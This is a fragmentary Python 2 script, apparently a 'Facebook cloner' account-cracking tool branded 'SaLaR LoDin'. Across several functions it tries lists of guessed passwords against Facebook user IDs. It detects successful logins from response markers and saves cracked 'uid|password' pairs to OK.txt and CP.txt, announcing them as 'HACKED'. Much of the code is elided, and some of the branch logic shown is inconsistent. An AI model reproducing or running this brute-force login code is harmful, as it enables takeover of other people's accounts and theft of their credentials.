...
def login():
    ...
    try:
        token = open('Salar_token.txt', 'r').read()
        menu()
...
def log_select():
    ...
    if sel == '1':
        ...
        os.system('xdg-open https://www.facebook.com/salarlodin60')
    elif sel == '6':
        os.system('exit')
    else:
        print ''
...
def menu():
    ...
    try:
        shankar = 'Salar_Lodin THE GOD LEVEL HACKER HERE~!!!'
        token = open('LoDin_token.txt', 'r').read()
    except (KeyError, IOError):
        login()
...
def crack_select():
    ...
    print '\x1b[1;37m======================================================='
    print '\x1b[1;32m     SaLaR♥LoDin-FACEBOOK-CLONER'
    print '\x1b[1;37m======================================================='
        ...
        try:
            ...
            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                ...
                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                    ...
                    sp = data.content
                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                        print '\x1b[1;92m[SaLaR_LoDuN-HACKED] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        ok = open('OK.txt', 'a')
                        ok.write(uid + '|' + ps3 + '\n')
                        ok.close()
                        oks.append(uid + ps3)
                    elif 'checkpoint' in sp:
                        print '\x1b[1;91m[SaLaR_LoDin-CHECKPOINT] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        cp = open('CP.txt', 'a')
                        cp.write(uid + '|' + ps3 + '\n')
                        cp.close()
                        cps.append(uid + ps3)
                        ...
                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                            ...
                            print '\x1b[1;91m[SaLaR_LoDiN-CHECKPOINT] ' + uid + ' | ' + ps4 + '\x1b[0;97m'
                            cp = open('CP.txt', 'a')
                            cp.write(uid + '|' + ps4 + '\n')
                            cp.close()
                            cps.append(uid + ps4)
                            ...
                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                ...
                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                    ...
                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                        ...
                                        sp = data.content
                                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                            print '\x1b[1;92m[LoDiN-HACKED] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            ok = open('OK.txt', 'a')
                                            ok.write(uid + '|' + ps8 + '\n')
                                            ok.close()
                                            oks.append(uid + ps8)
                                        elif 'checkpoint' in sp:
                                            print '\x1b[1;91m[SaLaR-CHECKPOINT] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            cp = open('CP.txt', 'a')
                                            cp.write(uid + '|' + ps8 + '\n')
                                            cp.close()
                                            cps.append(uid + ps8)
...
def pro_rishu():
    ...
    print '\x1b[1;97m======================================================='
    print '\x1b[1;93m     SaLaR-FACEBOOK-CLONER'
    print '\x1b[1;97m=======================================================-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                ...
                print '\x1b[1;91m[LoDiN-CHECKPOINT] ' + uid + ' | ' + ps + '\x1b[0;97m'
                cp = open('CP.txt', 'a')
                cp.write(uid + '|' + ps + '\n')
                cp.close()
                cps.append(uid + ps)
...
def digit_rx():
    ...
    print '\x1b[1;97m[=] THE PROCESS HAS STARTED'
    print '\x1b[1;97m======================================================='
    print '\x1b[1;93m     SaLaR_LoDiN-FACEBOOK-CLONER'
    print '\x1b[1;97m=======================================================-'
    ...
    def main(arg):
        ...
        try:
            ...
            sp = data.content
            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                print '\x1b[1;92m[Lodin-HACKED] ' + uid + ' | ' + ps + '\x1b[0;97m'
                ok = open('OK.txt', 'a')
                ok.write(uid + '|' + ps + '\n')
                ok.close()
                oks.append(uid + ps)
            elif 'checkpoint' in sp:
                print '\x1b[1;91m[Salar-CHECKPOINT] ' + uid + ' | ' + ps + '\x1b[0;97m'
                cp = open('CP.txt', 'a')
                cp.write(uid + '|' + ps + '\n')
                cp.close()
                cps.append(uid + ps)
                ...
                sp = data.content
                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                    print '\x1b[1;92m[SaLaR_LoDiN-HACKED] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    ok = open('OK.txt', 'a')
                    ok.write(uid + '|' + ps2 + '\n')
                    ok.close()
                    oks.append(uid + ps2)
                elif 'checkpoint' in sp:
                    print '\x1b[1;91m[Lodin-CHECKPOINT] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    cp = open('CP.txt', 'a')
                    cp.write(uid + '|' + ps2 + '\n')
                    cp.close()
                    cps.append(uid + ps2)
